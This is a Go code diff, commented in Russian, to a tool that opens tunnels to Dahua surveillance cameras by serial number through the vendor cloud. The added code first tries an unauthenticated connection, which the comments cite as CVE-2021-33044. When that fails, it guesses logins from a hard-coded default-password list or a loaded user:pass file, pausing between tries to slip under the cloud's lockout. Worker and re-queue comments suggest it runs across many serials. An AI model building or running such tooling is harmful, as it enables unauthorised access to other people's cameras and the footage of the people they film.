@@ -4,10 +4,13 @@ package fwd
 // «локальный порт → порт камеры» и отдаёт адреса 127.0.0.1:<port>.
 
 import (
+	"bufio"
 	"context"
 	"errors"
 	"fmt"
 	"net"
+	"os"
+	"strings"
 	"sync"
 	"time"
 
@@ -20,6 +23,9 @@ type Forwarder struct {
 	Err   chan error
 	mu    sync.Mutex
 	done  chan struct{}
+	User  string
+	Pass  string
+	Dtype int
 }
 
 // ErrDeviceNotFound — авторитетный ответ облака «камера не существует /
@@ -33,6 +39,71 @@ var ErrDeviceNotFound = errDeviceNotFound
 // соседних туннелей (готовый bind-on-demand стоит один round-trip).
 var DefaultPoolSize = 0
 
+// Дефолтные креды для Type-1 аутентификации на девайсах 2024+
+var (
+	defaultCredsMu   sync.RWMutex
+	DefaultLogin     = "admin"
+	DefaultPasswords = []string{
+		"admin",
+		"admin123",
+		"123456",
+		"password",
+		"tlJwpbo6",
+		"admin777",
+		"888888",
+		"dahua",
+	}
+	LockoutCooldown = 8 * time.Second // кулдаун теневого бана облака Dahua на прошивках 2024+
+)
+
+// SetDefaultCreds задаёт дефолтные логин и список паролей для проверки
+func SetDefaultCreds(login string, passwords []string) {
+	defaultCredsMu.Lock()
+	defer defaultCredsMu.Unlock()
+	if login != "" {
+		DefaultLogin = login
+	}
+	if len(passwords) > 0 {
+		DefaultPasswords = make([]string, len(passwords))
+		copy(DefaultPasswords, passwords)
+	}
+}
+
+// GetDefaultCreds возвращает текущие дефолтные логин и список паролей
+func GetDefaultCreds() (string, []string) {
+	defaultCredsMu.RLock()
+	defer defaultCredsMu.RUnlock()
+	login := DefaultLogin
+	passwords := make([]string, len(DefaultPasswords))
+	copy(passwords, DefaultPasswords)
+	return login, passwords
+}
+
+func getDefaultCreds() (string, []string) {
+	return GetDefaultCreds()
+}
+
+// LoadPasswordsFromFile загружает список паролей или пар user:pass из файла
+func LoadPasswordsFromFile(path string) ([]string, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var out []string
+	scanner := bufio.NewScanner(strings.NewReader(string(data)))
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
+			continue
+		}
+		out = append(out, line)
+	}
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+	return out, nil
+}
+
 // Start поднимает туннель и ждёт готовности листенеров (до 45 сек).
 // dtype: 0 = без авторизации (CVE-2021-33044), 1 = с кредами (p2p-channel V2).
 func Start(serial string, specs []PortSpec, dtype int, user, pass string) (*Forwarder, error) {
@@ -45,11 +116,18 @@ func Start(serial string, specs []PortSpec, dtype int, user, pass string) (*Forw
 
 	// раз за процесс: сверяем часы с облаком (WSSE Created), иначе
 	// уехавшие часы машины дают 401 TimeOut на всех туннелях
-	u := NewUDP(activeProfile.mainServer, activeProfile.mainPort, Debug, activeProfile)
+	u := NewUDP(t.profile.mainServer, t.profile.mainPort, Debug, t.profile)
 	ensureClockSync(u)
 	u.Close()
 
-	f := &Forwarder{t: t, Err: make(chan error, 1), done: make(chan struct{})}
+	f := &Forwarder{
+		t:     t,
+		Err:   make(chan error, 1),
+		done:  make(chan struct{}),
+		User:  user,
+		Pass:  pass,
+		Dtype: dtype,
+	}
 	errCh := make(chan error, 1)
 
 	go func() {
@@ -104,6 +182,11 @@ func (f *Forwarder) Alive() bool {
 	return !f.t.isStopped() && f.t.Failure() == nil
 }
 
+// IsRelay сообщает, работает ли туннель через промежуточный релей-сервер.
+func (f *Forwarder) IsRelay() bool {
+	return f != nil && f.t != nil && f.t.IsRelay()
+}
+
 // Stop глушит туннель и листенеры навсегда (runWithRetries не resurrect).
 func (f *Forwarder) Stop() {
 	select {
@@ -115,30 +198,100 @@ func (f *Forwarder) Stop() {
 	f.t.Terminate()
 }
 
-// StartWithAuth — поднимает форвардер, автоматически перебирая dtype:
-// сначала 0 (без авторизации), при отказе — 1 с кредами.
+// StartWithAuth — поднимает форвардер.
+// Если user и pass заданы:
+// СРАЗУ стартует через Type-1 (dtype: 1), БЕЗ отправки пустого Type 0,
+// чтобы не триггерить теневой 5-10 секундный бан облака Dahua на прошивках 2024+.
+//
+// Если user и pass пусты:
+// Сначала пробует Type 0 (CVE-2021-33044).
+// Если устройство вернуло 403 (ErrAuthRequired), значит это прошивка 2024+
+// (или пропатченная). В этом случае выжидается спад бана (LockoutCooldown)
+// и проверяются дефолтные пароли (DefaultPasswords) с паузой LockoutCooldown.
 func StartWithAuth(serial, user, pass string, specs []PortSpec) (*Forwarder, error) {
-	f, err0 := Start(serial, specs, 0, "", "")
+	targetSerial := serial
+	fallbackProfile := "dmss"
+	if ActiveProfile().name == "dmss" {
+		fallbackProfile = "smartpss"
+	}
+
+	if user != "" && pass != "" {
+		// Известные креды: бьём сразу Type-1 без предварительного Type 0
+		f, err := Start(targetSerial, specs, 1, user, pass)
+		if err == nil {
+			return f, nil
+		}
+		// Если 404 и профиль не зашит явно — пробуем альтернативное облако
+		if errors.Is(err, ErrDeviceNotFound) && !strings.Contains(serial, ",profile=") {
+			altSerial := serial + ",profile=" + fallbackProfile
+			fAlt, errAlt := Start(altSerial, specs, 1, user, pass)
+			if errAlt == nil {
+				return fAlt, nil
+			}
+		}
+		return nil, err
+	}
+
+	// Креды не заданы: пробуем Type 0 (CVE-2021-33044)
+	f, err0 := Start(targetSerial, specs, 0, "", "")
 	if err0 == nil {
 		return f, nil
 	}
-	if user != "" && pass != "" {
-		if f1, err1 := Start(serial, specs, 1, user, pass); err1 == nil {
-			return f1, nil
+
+	// Если 404 на дефолтном облаке и профиль не указан явно:
+	// пробуем альтернативный профиль (например, девайс 2024+ сидит на dmss, а дефолт smartpss)
+	if errors.Is(err0, ErrDeviceNotFound) && !strings.Contains(serial, ",profile=") {
+		altSerial := serial + ",profile=" + fallbackProfile
+		fAlt, errAlt := Start(altSerial, specs, 0, "", "")
+		if errAlt == nil {
+			return fAlt, nil
+		}
+		if isAuthError(errAlt) {
+			targetSerial = altSerial
+			err0 = errAlt
 		}
 	}
+
+	// Устройство требует авторизацию (403): проверяем пароли (девайсы 2024+)
+	login, passwords := getDefaultCreds()
+	if isAuthError(err0) && len(passwords) > 0 {
+		// Type 0 вызвал 403, значит облако заблокировало попытки к серийнику на 5-10с.
+		// Ждём спада теневого бана перед первой попыткой с паролем.
+		time.Sleep(LockoutCooldown)
+
+		for i, p := range passwords {
+			if i > 0 {
+				time.Sleep(LockoutCooldown)
+			}
+			u := login
+			pw := p
+			if idx := strings.Index(p, ":"); idx >= 0 {
+				u = p[:idx]
+				pw = p[idx+1:]
+			}
+			f1, err1 := Start(targetSerial, specs, 1, u, pw)
+			if err1 == nil {
+				f1.User = u
+				f1.Pass = pw
+				f1.Dtype = 1
+				return f1, nil
+			}
+			if errors.Is(err1, ErrDeviceNotFound) {
+				return nil, err1
+			}
+		}
+	}
+
 	return nil, err0
 }
 
-// StartSupervised — подъём туннеля с ОГРАНИЧЕННЫМ числом попыток.
-// Раньше крутился бесконечно: воркеры зависали на мёртвых серийниках,
-// держали init-слоты, и новые серийники не начинали обрабатываться
-// (каскад «tunnel ready timeout»). Теперь: maxAttempts внешних попыток,
-// каждая с внутренними ретраями runWithRetries; после исчерпания —
-// ошибка (серийник подберёт ре-очередь провайдера). Выход раньше срока:
-// туннель готов, ctx отменён (esc), устройства нет в облаке (404 —
-// рестарты бессмысленны). onEvent — строки прогресса (может быть nil).
+// StartSupervised — подъём туннеля с ОГРАНИЧЕННЫМ числом попыток без явных кредов.
 func StartSupervised(ctx context.Context, serial string, specs []PortSpec, onEvent func(string)) (*Forwarder, error) {
+	return StartSupervisedWithAuth(ctx, serial, "", "", specs, onEvent)
+}
+
+// StartSupervisedWithAuth — подъём туннеля с ОГРАНИЧЕННЫМ числом попыток и явными кредами.
+func StartSupervisedWithAuth(ctx context.Context, serial, user, pass string, specs []PortSpec, onEvent func(string)) (*Forwarder, error) {
 	const maxAttempts = 3
 	var lastErr error
 	for attempt := 1; attempt <= maxAttempts; attempt++ {
@@ -148,7 +301,7 @@ func StartSupervised(ctx context.Context, serial string, specs []PortSpec, onEve
 		if attempt > 1 && onEvent != nil {
 			onEvent(fmt.Sprintf(i18n.Tr("туннель: перезапуск демона (попытка %d)"), attempt))
 		}
-		f, err := StartWithAuth(serial, "", "", specs)
+		f, err := StartWithAuth(serial, user, pass, specs)
 		if err == nil {
 			if attempt > 1 && onEvent != nil {
 				onEvent(fmt.Sprintf(i18n.Tr("туннель поднят с %d-й попытки"), attempt))
